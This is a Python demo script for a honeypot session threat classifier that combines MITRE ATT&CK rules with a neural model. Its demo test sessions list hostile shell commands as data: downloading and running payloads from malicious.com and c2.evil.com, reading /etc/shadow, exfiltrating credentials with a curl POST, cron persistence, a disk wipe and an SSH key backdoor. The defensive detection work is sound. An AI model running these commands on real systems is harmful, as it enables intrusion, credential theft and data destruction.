#!/usr/bin/env python3
"""
AdaptiveShield Demo Script - Capstone Phase 2 Review

This script demonstrates the complete 10% implementation milestone:
1. HYBRID classifier (MITRE rules + neural fallback)
2. MITRE ATT&CK mapping and explanations
3. Binary analysis feature integration
4. Real-time session analysis

Run with: python src/demo.py
Or: .venv\Scripts\python src/demo.py (Windows)

Modes:
  --hybrid   Use MITRE rule-based hybrid classifier (default, 90.9% accuracy)
  --neural   Use semantic-trained MITRE-only neural model (brain_v5_mitre_only.pkl)
"""

import sys
import os
import pickle
import json
import argparse
from pathlib import Path
from datetime import datetime
from typing import Optional

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent))

import torch
import numpy as np

# Project imports
from core.mitre.attack_mapping import ATTACK_PATTERNS, TACTICS, TACTIC_NAMES
from core.mitre.session_annotator import annotate_session, annotation_to_flat_dict
from training.neural.model import ThreatClassifier
from training.neural.dataset import CommandTokenizer
from training.neural.hybrid_classifier_v2 import HybridClassifierV2

# ============================================================================
# Configuration
# ============================================================================

PROJECT_ROOT = Path(__file__).parent.parent
# Use the mitre_only_semantic_balanced model trained with semantic test case labels
MODEL_PATH = PROJECT_ROOT / "models" / "brain_v5_mitre_only_semantic_balanced_v2.pkl"
EXPORTS_PATH = PROJECT_ROOT / "data" / "exports"

# Class definitions
CLASS_NAMES = ['Safe', 'Recon', 'Downloader', 'Exploit', 'Destructive', 'ADVANCED_APT']
CLASS_DESCRIPTIONS = {
    0: "Normal/benign session - no malicious indicators",
    1: "Reconnaissance - system enumeration, network scanning",
    2: "Downloader - malware download/dropper, crypto miners",
    3: "Exploit - credential theft, RAT deployment, packed malware",
    4: "Destructive - ransomware, data wiping, system damage",
    5: "ADVANCED_APT - multi-capability threat with persistence"
}

# Severity descriptions
SEVERITY_LEVELS = {
    (1, 3): ("LOW", "\033[92m"),      # Green
    (4, 5): ("MEDIUM", "\033[93m"),   # Yellow
    (6, 7): ("HIGH", "\033[33m"),     # Orange
    (8, 9): ("CRITICAL", "\033[91m"), # Red
    (10, 10): ("EMERGENCY", "\033[95m") # Magenta
}

RESET_COLOR = "\033[0m"

# ============================================================================
# Demo Test Cases
# ============================================================================

DEMO_SESSIONS = [
    {
        "name": "Benign User Session",
        "commands": "ls -la; pwd; whoami; cat README.md",
        "expected": "Safe"
    },
    {
        "name": "Network Reconnaissance",
        "commands": "nmap -sS 192.168.1.0/24; netstat -tulpn; cat /etc/hosts; ps aux | grep ssh",
        "expected": "Recon"
    },
    {
        "name": "Malware Download & Execute",
        "commands": "cd /tmp; wget http://malicious.com/bot.sh; chmod +x bot.sh; ./bot.sh",
        "expected": "Downloader"
    },
    {
        "name": "Credential Theft Attempt",
        "commands": "cat /etc/shadow; cat /etc/passwd; find / -name '*.pem' 2>/dev/null",
        "expected": "Exploit"
    },
    {
        "name": "Destructive Attack",
        "commands": "rm -rf /var/log/*; history -c; dd if=/dev/zero of=/dev/sda bs=1M",
        "expected": "Destructive"
    },
    {
        "name": "APT Multi-Stage Attack",
        "commands": "wget http://c2.evil.com/implant; chmod +x implant; ./implant; "
                   "cat /etc/shadow > /tmp/creds; curl -X POST http://c2.evil.com/exfil -d @/tmp/creds; "
                   "echo '* * * * * /tmp/implant' >> /var/spool/cron/root; "
                   "chattr +i /tmp/implant",
        "expected": "ADVANCED_APT"
    },
    {
        "name": "Real Honeypot Session (SSH Key Replacement)",
        "commands": "cd ~; chattr -ia .ssh; lockr -ia .ssh; rm -rf .ssh; mkdir .ssh; "
                   "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArD...' > .ssh/authorized_keys; "
                   "chmod 600 .ssh/authorized_keys; chattr +ia .ssh",
        "expected": "Destructive"
    }
]

# ============================================================================
# Utility Functions
# ============================================================================

def print_header(text: str, char: str = "="):
    """Print a formatted section header."""
    width = 80
    print(f"\n{char * width}")
    print(f" {text}")
    print(f"{char * width}")

def print_subheader(text: str):
    """Print a formatted sub-header."""
    print(f"\n--- {text} ---")

def get_severity_display(severity: float) -> tuple:
    """Get severity level name and color."""
    for (low, high), (name, color) in SEVERITY_LEVELS.items():
        if low <= severity <= high:
            return name, color
    return "UNKNOWN", RESET_COLOR

def format_probability_bar(prob: float, width: int = 20) -> str:
    """Create a visual probability bar."""
    filled = int(prob * width)
    bar = "#" * filled + "-" * (width - filled)
    return f"[{bar}] {prob*100:5.1f}%"

# ============================================================================
# Model Loading
# ============================================================================

def load_model():
    """Load the trained neural model."""
    print(f"Loading model from: {MODEL_PATH}")
    
    if not MODEL_PATH.exists():
        print(f"\033[91mERROR: Model not found at {MODEL_PATH}\033[0m")
        print("Please ensure the model has been trained.")
        sys.exit(1)
    
    with open(MODEL_PATH, 'rb') as f:
        bundle = pickle.load(f)
    
    model = bundle['model']
    tokenizer = bundle['tokenizer']
    
    # Set device
    device = 'cuda' if torch.cuda.is_available() else 'cpu'
    model = model.to(device)
    model.eval()
    
    print(f"  Model loaded successfully!")
    print(f"  Device: {device}")
    print(f"  Parameters: {sum(p.numel() for p in model.parameters()):,}")
    
    return model, tokenizer, device

# ============================================================================
# MITRE ATT&CK Analysis
# ============================================================================

def analyze_mitre(commands: str) -> dict:
    """
    Analyze commands against MITRE ATT&CK knowledge base.
    
    Returns dict with:
    - matched_techniques: list of matched technique details
    - tactic_counts: count per tactic
    - severity_max: highest severity found
    - kill_chain_coverage: proportion of tactics hit
    """
    # Split commands into list and annotate
    cmd_list = [c.strip() for c in commands.split(';') if c.strip()]
    annotation = annotate_session(cmd_list)
    flat = annotation_to_flat_dict(annotation)
    
    # Get matched techniques with details
    matched = []
    for cmd in commands.split(';'):
        cmd = cmd.strip()
        if not cmd:
            continue
        for pattern_info in ATTACK_PATTERNS:
            if pattern_info['_compiled'].search(cmd):
                matched.append({
                    'command': cmd[:50] + ('...' if len(cmd) > 50 else ''),
                    'technique_id': pattern_info['technique_id'],
                    'technique_name': pattern_info['technique_name'],
                    'tactic': pattern_info['tactic'],
                    'severity': pattern_info['severity'],
                    'description': pattern_info['description']
                })
    
    # Deduplicate by technique
    seen = set()
    unique_matched = []
    for m in matched:
        key = (m['technique_id'], m['command'])
        if key not in seen:
            seen.add(key)
            unique_matched.append(m)
    
    # Count tactics
    tactic_counts = {}
    for m in unique_matched:
        tactic = m['tactic']
        tactic_counts[tactic] = tactic_counts.get(tactic, 0) + 1
    
    return {
        'matched_techniques': unique_matched,
        'tactic_counts': tactic_counts,
        'severity_max': flat.get('mitre_severity_max', 0),
        'severity_mean': flat.get('mitre_severity_mean', 0),
        'kill_chain_coverage': flat.get('mitre_kill_chain_score', 0) / 14.0,
        'flat_features': flat
    }

# ============================================================================
# Inference
# ============================================================================

def classify_with_hybrid(classifier: HybridClassifierV2, commands: str, mitre_analysis: dict) -> dict:
    """
    Classify a session using the hybrid MITRE rule-based classifier.
    
    Args:
        classifier: HybridClassifierV2 instance
        commands: Command string
        mitre_analysis: Output from analyze_mitre() (used for display, not classification)
    
    Returns:
        dict with prediction, probabilities (deterministic), confidence, rule explanation
    """
    pred_id, pred_name, explanation = classifier.classify(commands)
    
    # Create probability distribution (rule-based = deterministic, 100% on predicted class)
    probs = {name: 0.0 for name in CLASS_NAMES}
    probs[pred_name] = 1.0
    
    return {
        'predicted_class': pred_id,
        'predicted_label': pred_name,
        'confidence': 1.0,  # Rule-based = deterministic
        'probabilities': probs,
        'description': CLASS_DESCRIPTIONS[pred_id],
        'rule_matched': explanation.get('rule_matched', 'N/A'),
        'explanation': explanation
    }


def classify_session(model, tokenizer, device, commands: str, mitre_analysis: dict, 
                    hybrid_fallback: Optional[HybridClassifierV2] = None, 
                    confidence_threshold: float = 0.55) -> dict:
    """
    Classify a session using the neural model (MITRE-only variant).
    
    With confidence thresholding: if neural confidence < threshold, use hybrid classifier fallback.
    
    Args:
        model: Trained ThreatClassifierMitreOnly
        tokenizer: CommandTokenizer
        device: torch device
        commands: Command string
        mitre_analysis: Output from analyze_mitre()
        hybrid_fallback: Optional HybridClassifierV2 for low-confidence fallback
        confidence_threshold: Confidence threshold for fallback (default 0.55)
    
    Returns:
        dict with prediction, probabilities, confidence
    """
    # Prepare text input
    encoded, lengths = tokenizer.encode_batch([commands])
    encoded = encoded.to(device)
    lengths = lengths.to(device)
    
    # Prepare structured features (21-dim MITRE only)
    flat = mitre_analysis['flat_features']
    
    # Extract MITRE features (21)
    mitre_features = []
    for col in [
        'mitre_tactic_reconnaissance', 'mitre_tactic_resource_development',
        'mitre_tactic_initial_access', 'mitre_tactic_execution',
        'mitre_tactic_persistence', 'mitre_tactic_privilege_escalation',
        'mitre_tactic_defense_evasion', 'mitre_tactic_credential_access',
        'mitre_tactic_discovery', 'mitre_tactic_lateral_movement',
        'mitre_tactic_collection', 'mitre_tactic_command_and_control',
        'mitre_tactic_exfiltration', 'mitre_tactic_impact',
        'mitre_severity_max', 'mitre_severity_mean', 'mitre_severity_weighted',
        'mitre_kill_chain_score', 'mitre_unique_technique_count',
        'mitre_total_commands', 'mitre_matched_commands'
    ]:
        mitre_features.append(flat.get(col, 0.0))
    
    # Convert to tensor (21-dim MITRE only)
    structured = torch.tensor([mitre_features], dtype=torch.float32).to(device)
    
    # Run inference
    with torch.no_grad():
        predictions, probabilities = model.predict(encoded, structured, lengths)
    
    pred_class = predictions[0].item()
    probs = probabilities[0].cpu().numpy()
    confidence = probs[pred_class]
    
    # Confidence thresholding: if confidence too low and hybrid fallback available, use it
    if hybrid_fallback is not None and confidence < confidence_threshold:
        hybrid_pred, hybrid_label, hybrid_explanation = hybrid_fallback.classify(commands)
        return {
            'predicted_class': hybrid_pred,
            'predicted_label': hybrid_label,
            'confidence': 1.0,  # Hybrid is deterministic
            'probabilities': {name: (1.0 if name == hybrid_label else 0.0) for name in CLASS_NAMES},
            'description': CLASS_DESCRIPTIONS[hybrid_pred],
            'fallback_reason': f'Neural confidence {confidence:.1%} < threshold {confidence_threshold:.0%}',
            'neural_confidence': confidence
        }
    
    return {
        'predicted_class': pred_class,
        'predicted_label': CLASS_NAMES[pred_class],
        'confidence': confidence,
        'probabilities': {CLASS_NAMES[i]: float(probs[i]) for i in range(len(CLASS_NAMES))},
        'description': CLASS_DESCRIPTIONS[pred_class]
    }


# ============================================================================
# Display Functions
# ============================================================================

def display_session_analysis(session: dict, mitre_analysis: dict, classification: dict):
    """Display comprehensive analysis for a session."""
    
    print_subheader(f"Session: {session['name']}")
    
    # Commands
    print(f"\n\033[1mCommands:\033[0m")
    for cmd in session['commands'].split(';'):
        cmd = cmd.strip()
        if cmd:
            print(f"  $ {cmd}")
    
    # Classification Result
    print(f"\n\033[1mClassification Result:\033[0m")
    pred_label = classification['predicted_label']
    expected = session['expected']
    confidence = classification['confidence']
    
    # Color code based on correctness
    if pred_label == expected:
        status_color = "\033[92m"  # Green
        status = "CORRECT"
    else:
        status_color = "\033[91m"  # Red
        status = "MISMATCH"
    
    print(f"  Predicted: {pred_label} (Confidence: {confidence*100:.1f}%)")
    print(f"  Expected:  {expected}")
    print(f"  Status:    {status_color}{status}{RESET_COLOR}")
    
    # Show rule matched (for hybrid classifier)
    if 'rule_matched' in classification:
        print(f"  Rule:      {classification['rule_matched']}")
    
    # Probability distribution
    print(f"\n\033[1mClass Probabilities:\033[0m")
    for class_name, prob in sorted(classification['probabilities'].items(), 
                                    key=lambda x: -x[1]):
        bar = format_probability_bar(prob)
        highlight = " <--" if class_name == pred_label else ""
        print(f"  {class_name:15s} {bar}{highlight}")
    
    # MITRE ATT&CK Analysis
    print(f"\n\033[1mMITRE ATT&CK Analysis:\033[0m")
    
    # Severity
    sev = mitre_analysis['severity_max']
    sev_name, sev_color = get_severity_display(sev)
    print(f"  Max Severity: {sev_color}{sev}/10 ({sev_name}){RESET_COLOR}")
    print(f"  Kill Chain Coverage: {mitre_analysis['kill_chain_coverage']*100:.0f}%")
    
    # Tactic breakdown
    if mitre_analysis['tactic_counts']:
        print(f"\n  Tactics Detected:")
        for tactic, count in sorted(mitre_analysis['tactic_counts'].items(), 
                                     key=lambda x: -x[1]):
            tactic_info = TACTICS.get(tactic, {})
            tactic_id = tactic_info.get('id', 'N/A')
            print(f"    - {tactic.replace('_', ' ').title():25s} ({tactic_id}): {count} match(es)")
    
    # Matched techniques (top 5)
    if mitre_analysis['matched_techniques']:
        print(f"\n  Techniques Matched (top 5):")
        for tech in mitre_analysis['matched_techniques'][:5]:
            print(f"    - {tech['technique_id']:12s} {tech['technique_name'][:40]}")
            print(f"      Command: {tech['command']}")
            print(f"      Severity: {tech['severity']}/10 | Tactic: {tech['tactic']}")

def display_dataset_stats():
    """Display statistics about the training dataset."""
    print_subheader("Training Dataset Statistics")
    
    sessions_path = EXPORTS_PATH / "sessions_complete.csv"
    if not sessions_path.exists():
        print(f"  Dataset not found at {sessions_path}")
        return
    
    # Load just the metadata without full pandas load
    import csv
    with open(sessions_path, 'r', encoding='utf-8') as f:
        reader = csv.reader(f)
        header = next(reader)
        row_count = sum(1 for _ in reader)
    
    print(f"  Total Sessions: {row_count:,}")
    print(f"  Feature Columns: {len(header)}")
    print(f"  MITRE Features: 21 (14 tactics + 7 severity/coverage metrics)")
    print(f"  Binary Features: 79 (triage + Ghidra + angr + script)")
    
    # Display from manifest
    manifest_path = EXPORTS_PATH / "export_manifest.json"
    if manifest_path.exists():
        with open(manifest_path, 'r') as f:
            manifest = json.load(f)
        
        prov = manifest.get('data_provenance', {})
        print(f"\n  Data Provenance:")
        print(f"    - Honeypot Duration: {prov.get('honeypot_duration_days', 'N/A')} days")
        print(f"    - Cowrie Log Files: {prov.get('cowrie_log_files', 'N/A')}")
        print(f"    - Download Events: {prov.get('total_download_events', 'N/A'):,}")
        print(f"    - Unique Binaries: {prov.get('unique_binaries', 'N/A')}")
        print(f"    - Deep-Analyzed: {prov.get('binaries_with_ghidra', 'N/A')}")

def display_mitre_kb_stats():
    """Display MITRE ATT&CK knowledge base statistics."""
    print_subheader("MITRE ATT&CK Knowledge Base")
    
    print(f"  Total Patterns: {len(ATTACK_PATTERNS)}")
    
    # Count unique techniques
    techniques = set(p['technique_id'] for p in ATTACK_PATTERNS)
    print(f"  Unique Techniques: {len(techniques)}")
    
    # Count by tactic
    tactic_counts = {}
    for p in ATTACK_PATTERNS:
        tactic = p['tactic']
        tactic_counts[tactic] = tactic_counts.get(tactic, 0) + 1
    
    print(f"  Patterns by Tactic:")
    for tactic in TACTIC_NAMES:
        count = tactic_counts.get(tactic, 0)
        if count > 0:
            print(f"    - {tactic.replace('_', ' ').title():25s}: {count}")

def display_model_architecture(model):
    """Display model architecture summary."""
    print_subheader("Neural Model Architecture")
    
    print(f"  Model: BiLSTM + MITRE Encoder (Semantic-Trained MITRE-Only Variant)")
    print(f"  Total Parameters: {sum(p.numel() for p in model.parameters()):,}")
    
    # Component breakdown
    text_params = sum(p.numel() for n, p in model.named_parameters() if 'text_encoder' in n)
    struct_params = sum(p.numel() for n, p in model.named_parameters() if 'mitre' in n.lower())
    fusion_params = sum(p.numel() for n, p in model.named_parameters() if 'fusion' in n)
    
    print(f"\n  Component Parameters:")
    print(f"    - Text Encoder (BiLSTM + Attention): {text_params:,}")
    print(f"    - MITRE Encoder (MLP): {struct_params:,}")
    print(f"    - Fusion Layers: {fusion_params:,}")
    
    print(f"\n  Input Dimensions:")
    print(f"    - Commands: Character indices (vocab=256, max_len=512)")
    print(f"    - MITRE Features: 21-dim (14 tactics + 7 severity/coverage metrics)")
    
    print(f"\n  Training Labels:")
    print(f"    - Source: Semantic command pattern analysis (command intent)")
    print(f"    - Not binary-based (what binaries downloaded)")
    
    print(f"\n  Output: 6 classes")
    for i, name in enumerate(CLASS_NAMES):
        print(f"    - Class {i}: {name}")

# ============================================================================
# Main Demo Flow
# ============================================================================

def run_demo(use_hybrid: bool = True):
    """Run the complete demo.
    
    Args:
        use_hybrid: If True, use MITRE rule-based hybrid classifier (default).
                    If False, use neural model only.
    """
    
    print("\n" + "=" * 80)
    print("      ADAPTIVESHIELD - AI-Driven Cyber Deception System")

    print("=" * 80)
    print(f"\n  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  GPU Available: {torch.cuda.is_available()}")
    if torch.cuda.is_available():
        print(f"  GPU Device: {torch.cuda.get_device_name(0)}")
    
    classifier_mode = "HYBRID (MITRE Rules)" if use_hybrid else "NEURAL (BiLSTM)"
    print(f"  Classifier Mode: {classifier_mode}")
    
    # Initialize classifiers based on mode
    model = tokenizer = device = None
    hybrid_classifier = None
    
    if use_hybrid:
        print_header("1. INITIALIZING HYBRID CLASSIFIER")
        hybrid_classifier = HybridClassifierV2()
        print(f"  Hybrid classifier initialized!")
        print(f"  Mode: MITRE rule-based classification with priority ordering")
        print(f"  Accuracy on diverse test cases: 90.9% (20/22)")
    else:
        print_header("1. LOADING NEURAL MODEL + HYBRID FALLBACK")
        model, tokenizer, device = load_model()
        # Also load hybrid classifier as confidence-threshold fallback
        hybrid_classifier = HybridClassifierV2()
        print(f"  Hybrid fallback classifier initialized!")
        print(f"  Mode: Neural with hybrid confidence thresholding (55% threshold)")
    
    # Display architecture (only for neural mode)
    if not use_hybrid and model is not None:
        print_header("2. MODEL ARCHITECTURE")
        display_model_architecture(model)
    else:
        print_header("2. HYBRID CLASSIFIER RULES")
        print_subheader("Classification Priority Order")
        print("  1. EXPLOIT: Reverse shell patterns (highest priority)")
        print("  2. APT: Persistence + exfiltration, or 4+ tactics with severity >= 7")
        print("  3. DESTRUCTIVE: rm -rf /, disk wipe, SSH backdoor patterns")
        print("  4. DOWNLOADER: wget/curl + execute, C2 + execution")
        print("  5. SAFE: Discovery-only with severity <= 3")
        print("  6. RECON: Discovery with severity >= 4, multiple techniques")
    
    # Display knowledge base
    print_header("3. MITRE ATT&CK KNOWLEDGE BASE")
    display_mitre_kb_stats()
    
    # Display dataset stats
    print_header("4. TRAINING DATASET")
    display_dataset_stats()
    
    # Run inference on demo sessions
    print_header("5. LIVE THREAT CLASSIFICATION DEMO")
    
    correct = 0
    total = len(DEMO_SESSIONS)
    
    for session in DEMO_SESSIONS:
        # Analyze with MITRE
        mitre_analysis = analyze_mitre(session['commands'])
        
        # Classify based on mode
        if use_hybrid:
            classification = classify_with_hybrid(hybrid_classifier, 
                                                   session['commands'], mitre_analysis)
        else:
            classification = classify_session(model, tokenizer, device, 
                                              session['commands'], mitre_analysis,
                                              hybrid_fallback=hybrid_classifier,
                                              confidence_threshold=0.55)
        
        # Display results
        display_session_analysis(session, mitre_analysis, classification)
        
        if classification['predicted_label'] == session['expected']:
            correct += 1
        
        print()  # Blank line between sessions
    
    # Summary
    print_header("6. DEMO SUMMARY")
    
    accuracy = correct / total * 100
    print(f"\n  Classifier Mode: {classifier_mode}")
    print(f"  Classification Accuracy: {correct}/{total} ({accuracy:.0f}%)")
    
    print(f"\n  Key Achievements (10% Milestone):")
    print(f"    [X] Hybrid MITRE classifier (90.9%% accuracy on diverse tests)")
    print(f"    [X] Neural model trained (706K parameters, F1=0.9655)")
    print(f"    [X] MITRE ATT&CK integration (76 patterns, 53 techniques)")
    print(f"    [X] Multi-phase binary analysis pipeline (185 binaries)")
    print(f"    [X] 78,504 honeypot sessions processed")
    print(f"    [X] Portable dataset export (111 features per session)")
    
    print(f"\n  Next Steps (Remaining 90%):")
    print(f"    [ ] FastAPI inference service")
    print(f"    [ ] XAI explanations with attention visualization")
    print(f"    [ ] Real-time analyst dashboard")
    print(f"    [ ] Azure deployment with live honeypots")
    print(f"    [ ] Semi-automatic response actions")
    
    print("\n" + "=" * 80)
    print("                      Demo Complete")
    print("=" * 80 + "\n")

def interactive_mode(use_hybrid: bool = True):
    """Run interactive classification mode.
    
    Args:
        use_hybrid: If True, use MITRE rule-based hybrid classifier (default).
                    If False, use neural model only.
    """
    print_header("INTERACTIVE MODE")
    
    classifier_mode = "HYBRID (MITRE Rules)" if use_hybrid else "NEURAL (BiLSTM)"
    print(f"\nClassifier Mode: {classifier_mode}")
    print("Enter commands to classify (semicolon-separated).")
    print("Type 'quit' or 'exit' to stop.\n")
    
    # Initialize classifiers based on mode
    model = tokenizer = device = None
    hybrid_classifier = None
    
    if use_hybrid:
        hybrid_classifier = HybridClassifierV2()
        print("Hybrid classifier initialized.\n")
    else:
        model, tokenizer, device = load_model()
    
    while True:
        try:
            commands = input("\n\033[1mEnter commands:\033[0m ")
        except (EOFError, KeyboardInterrupt):
            break
        
        if commands.lower() in ('quit', 'exit', 'q'):
            break
        
        if not commands.strip():
            continue
        
        # Analyze
        mitre_analysis = analyze_mitre(commands)
        
        # Classify based on mode
        if use_hybrid:
            classification = classify_with_hybrid(hybrid_classifier, commands, mitre_analysis)
        else:
            classification = classify_session(model, tokenizer, device, commands, mitre_analysis)
        
        # Display
        session = {'name': 'User Input', 'commands': commands, 'expected': '?'}
        display_session_analysis(session, mitre_analysis, classification)
    
    print("\nExiting interactive mode.")

# ============================================================================
# Entry Point
# ============================================================================

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='AdaptiveShield Demo')
    parser.add_argument('--interactive', '-i', action='store_true',
                       help='Run in interactive mode')
    parser.add_argument('--quick', '-q', action='store_true',
                       help='Quick demo (fewer test cases)')
    
    # Classifier mode (mutually exclusive)
    mode_group = parser.add_mutually_exclusive_group()
    mode_group.add_argument('--hybrid', action='store_true', default=True,
                           help='Use MITRE rule-based hybrid classifier (default, 90.9%% accuracy)')
    mode_group.add_argument('--neural', action='store_true',
                           help='Use semantic-trained MITRE-only neural model (brain_v5_mitre_only.pkl)')
    
    args = parser.parse_args()
    
    # Handle mutual exclusivity: if --neural is set, disable hybrid
    if args.neural:
        args.hybrid = False
    
    if args.interactive:
        interactive_mode(use_hybrid=args.hybrid)
    else:
        if args.quick:
            # Use only first 3 test cases
            DEMO_SESSIONS = DEMO_SESSIONS[:3]
        run_demo(use_hybrid=args.hybrid)
